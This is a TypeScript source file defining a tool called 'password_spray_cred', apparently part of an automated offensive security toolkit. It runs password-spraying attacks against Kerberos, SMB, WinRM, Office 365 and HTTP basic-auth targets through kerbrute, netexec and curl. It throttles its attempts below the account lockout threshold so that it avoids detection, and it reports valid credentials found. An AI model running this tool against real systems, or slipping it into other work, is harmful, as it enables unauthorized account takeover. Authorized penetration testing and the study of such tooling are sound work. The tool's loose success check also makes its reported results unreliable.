// T76 — password_spray_cred
// Lockout-aware password spray across Kerberos, O365, SMB, HTTP targets.

import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const definition: ToolDefinition = {
  name: 'password_spray_cred',
  description:
    'Lockout-aware password spray. Tests a list of users against one or more passwords using the ' +
    'specified protocol. Tracks per-user attempt count and backs off at lockout_threshold - 1 to ' +
    'avoid locking accounts. Protocols: kerberos (kerbrute), smb/winrm (netexec), o365 (netexec ' +
    'with --o365), http (basic/digest/form auth).',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'target',            type: 'string', required: true,  description: 'Target hostname/IP or domain' },
    { name: 'protocol',          type: 'string', required: false, description: 'Protocol: kerberos / smb / winrm / o365 / http', default: 'smb' },
    { name: 'userlist',          type: 'string', required: true,  description: 'Newline-separated usernames or path to file' },
    { name: 'password_list',     type: 'string', required: true,  description: 'Newline-separated passwords to spray' },
    { name: 'domain',            type: 'string', required: false, description: 'Domain name (for Kerberos/SMB)' },
    { name: 'lockout_threshold', type: 'number', required: false, description: 'Account lockout threshold — spray stops at threshold-1', default: 3 },
    { name: 'delay_ms',          type: 'number', required: false, description: 'Delay between spray rounds (ms)', default: 30000 },
    { name: 'timeout_ms',        type: 'number', required: false, description: 'Per-command timeout ms', default: 60000 },
  ],
};

export const passwordSprayCredTool = {
  definition,
  async execute(params: Record<string, unknown>, exec: CommandExecutor): Promise<ToolResult> {
    const target = String(params.target || '');
    const protocol = String(params.protocol || 'smb').toLowerCase();
    const domain = params.domain ? String(params.domain) : undefined;
    const lockoutThreshold = Math.max(2, Number(params.lockout_threshold || 3));
    const delayMs = Number(params.delay_ms || 30000);
    const timeoutMs = Number(params.timeout_ms || 60000);

    if (!target) return { output: 'target required', parsed: { error: 'missing_target' } };
    if (!params.userlist) return { output: 'userlist required', parsed: { error: 'missing_userlist' } };
    if (!params.password_list) return { output: 'password_list required', parsed: { error: 'missing_password_list' } };

    const users = String(params.userlist).trim().split(/\r?\n/).map(u => u.trim()).filter(Boolean);
    const passwords = String(params.password_list).trim().split(/\r?\n/).map(p => p.trim()).filter(Boolean);

    const maxAttempts = lockoutThreshold - 1;
    const results: Array<{ user: string; password: string; success: boolean; note: string }> = [];
    const userAttempts: Map<string, number> = new Map();

    const lines = [
      `password_spray_cred — ${protocol.toUpperCase()} spray on ${target}`,
      `Users: ${users.length}  Passwords: ${passwords.length}  Max attempts per user: ${maxAttempts}`,
      '─'.repeat(72),
    ];

    for (const password of passwords.slice(0, maxAttempts)) {
      for (const user of users) {
        const attempts = userAttempts.get(user) || 0;
        if (attempts >= maxAttempts) continue;
        userAttempts.set(user, attempts + 1);

        let execBin = '';
        let execArgs: string[] = [];

        if (protocol === 'kerberos') {
          // kerbrute requires a file for the user list — write to a temp file to avoid shell injection
          const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'genesis_spray_'));
          const userFile = path.join(tmpDir, 'users.txt');
          fs.writeFileSync(userFile, user);
          execBin = 'kerbrute';
          execArgs = ['passwordspray', '--dc', target, '--domain', domain || target, userFile, password];
        } else if (protocol === 'smb') {
          execBin = 'netexec';
          execArgs = ['smb', target, '-u', user, '-p', password, ...(domain ? ['-d', domain] : [])];
        } else if (protocol === 'winrm') {
          execBin = 'netexec';
          execArgs = ['winrm', target, '-u', user, '-p', password, ...(domain ? ['-d', domain] : [])];
        } else if (protocol === 'o365') {
          execBin = 'netexec';
          execArgs = ['o365', target, '-u', user, '-p', password];
        } else {
          // http basic auth
          const creds = `${domain ? domain + '/' : ''}${user}:${password}`;
          execBin = 'curl';
          execArgs = ['-s', '-o', '/dev/null', '-w', '%{http_code}', '--max-time', '10', '-u', creds, target];
        }

        try {
          const result = await exec.execute(execBin, execArgs, timeoutMs);
          const output = result.stdout + result.stderr;
          const success = output.includes('[+]') || output.includes('Pwn3d!') || output.includes('200') ||
                          output.toLowerCase().includes('success') || output.includes('(Pwn3d!)');
          results.push({ user, password, success, note: output.substring(0, 100).replace(/\s+/g, ' ') });
          if (success) lines.push(`  ⚡ SUCCESS  ${user}:${password}  ${output.substring(0, 60)}`);
        } catch (err) {
          results.push({ user, password, success: false, note: String(err) });
        }
      }

      // Delay between password rounds to avoid lockout
      if (password !== passwords[passwords.length - 1]) {
        await new Promise(r => setTimeout(r, delayMs));
      }
    }

    const successes = results.filter(r => r.success);
    lines.unshift(`Valid credentials found: ${successes.length}`);

    return {
      output: lines.join('\n'),
      parsed: { valid_count: successes.length, valid: successes, results },
    };
  },
};
